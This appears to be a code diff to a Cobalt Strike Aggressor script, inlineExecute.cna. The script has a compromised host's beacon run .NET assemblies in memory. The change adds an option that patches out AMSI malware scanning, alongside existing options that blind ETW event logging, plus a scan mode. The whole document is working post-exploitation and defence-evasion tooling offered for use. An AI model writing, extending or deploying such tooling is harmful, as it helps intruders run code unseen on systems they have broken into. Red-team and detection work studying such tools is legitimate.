@@ -1,6 +1,6 @@
 # inlineExecute.cna
 
-$help = "Usage: inlineExecute [-etwH] [-etwB] [-verbose] <filepath> <args>"; 
+$help = "Usage: inlineExecute [-etwH] [-etwB] [-amsi] [-verbose] [-scan] <filepath> <args>"; 
 
 beacon_command_register(
 	"inlineExecute",
@@ -15,13 +15,14 @@ alias inlineExecute {
 	$data = substr($0, $commandLength + 1); # +1 to include a " " space
 	$dataLength = &strlen($data);
 	
-	local('$bid $filepath $bof_args')
-	
 	@args = split(' ', $data);
 	
 	$patchEtwProviderHandle = false;
 	$patchEtwEnableBits = false;
 	$verbose = false;
+	$patchAmsi = false;
+	$scan = false;
+	
 	for ($i = 0; $i < size(@args); $i++) {
 		if (@args[$i] iswm "-etwH") {
 			$patchEtwProviderHandle = true;
@@ -32,10 +33,26 @@ alias inlineExecute {
 		} else if (@args[$i] iswm "-verbose") {
 			$verbose = true;
 			
+		} else if (@args[$i] iswm "-amsi") {
+			$patchAmsi = true;
+			
+		} else if (@args[$i] iswm "-scan") {
+			$scan = true;
+			
 		} else {
 			$filepath = @args[$i];
 			break;
 		}
+	}
+	
+	$handle = openf(script_resource("inlineExecute.o"));
+	$bof = readb($handle, -1);
+	
+	if ($scan) {
+		@arr = @();
+		$bof_args = bof_pack($1, "biziiiii", "", 0, "", 0, 0, 0, 0, $scan);
+		beacon_inline_execute($1, $bof, "go", $bof_args);
+		return;
 	}
 	
 	$filepathLength = &strlen($filepath);
@@ -43,9 +60,6 @@ alias inlineExecute {
 		blog($1, $help);
 		return;
 	}
-	
-	$handle = openf(script_resource("inlineExecute.o"));
-	$bof = readb($handle, -1);
 	
 	$assemblyHandle = openf($filepath);
 	$assemblyLength = lof($filepath);
@@ -65,7 +79,6 @@ alias inlineExecute {
 		return;
 	}
 	
-	$bof_args = bof_pack($1, "biziii", $assemblyBytes, $assemblyLength, $assemblyArgs, $patchEtwProviderHandle, $patchEtwEnableBits, $verbose);
-	
+	$bof_args = bof_pack($1, "biziiiii", $assemblyBytes, $assemblyLength, $assemblyArgs, $patchEtwProviderHandle, $patchEtwEnableBits, $patchAmsi, $verbose, $scan);
 	beacon_inline_execute($1, $bof, "go", $bof_args);
 }
